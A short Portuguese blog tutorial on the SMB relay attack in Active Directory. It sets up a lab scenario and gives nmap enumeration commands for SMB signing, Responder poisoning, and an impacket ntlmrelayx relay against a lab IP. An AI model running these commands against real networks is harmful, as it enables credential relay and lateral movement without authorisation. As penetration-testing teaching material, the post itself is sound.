---
title: "SMB Relay Attack"
#date: 2022-10-01T18:13:02+01:00
draft: false
tags:
  - Active Directory
  - Poisoning & Spoofing
  - NTLMV2
  - MITM
  - SMB
---

## Definição

Em vez de capturarmos as _hashes_ e tentarmos extrair a password podendo não existir sucesso devido à sua complexidade.
Este ataque usa a _hash_ capturada e encaminha para ganhar acesso noutra maquina, fazendo _relay_ da _hash_.
Em caso de sucesso este ataque é usado para movimentação lateral dentro de um dominio.

## Cenário

O cenário é constituido por duas _workstations_ em que o utilizador José Cid é _local administrator_ nas duas maquinas (WS01 e WS02).
O _SMB Signing_ encontra-se desabilitado.

![](CenarioSMBRelay.jpg#center)

### Requisitos

Para que este ataque seja possivel, o ambiente tem de ter os seguintes requisitos:

- _SMB Signing_ _disabled_;
- O utilizador tem de ser administrator local das maquinas envolvidas.

## Enumeração

### SMB Signing Disabled

O primeiro passo é verificar se o _SMB Signing_ está inactivo e para isso usaremos o nmap com o comando abaixo:

```bash

nmap -Pn --script=smb2-security-mode.nse -p 445 <IP>

```

ou

```bash

nmap -Pn --script=smb2-security-mode.nse -p 445 <IP>/<CIDR>

```

Podemos verificar que está activo mas não obrigatório o seu uso.

![](smbrecon.png#center)

## Exploração (PoC)

### Configuração do _responder_

Como o objectivo é reenviar a _hash_ que iremos receber para outra workstation iremos configurar o _responder_ .
Teremos que desabilitar

```bash
sudo vi /etc/responder/Responder.conf
```

![](smbrelayresponderconfig.png)

```bash
sudo responder -I eth0 -wdv

```

![](smbrelayresponderrunning.png)

De seguida iremos utilizar uma ferramenta da _impacket_ para fazer relay da _hash_ para a outra máquina com o objectivo de ganharmos acesso sobre a mesma.

impacket-ntlmrelayx -smb2support -t 192.168.0.102

**[LLMNR](/posts/ad_llmnr/#explora%C3%A7%C3%A3o-poc)**
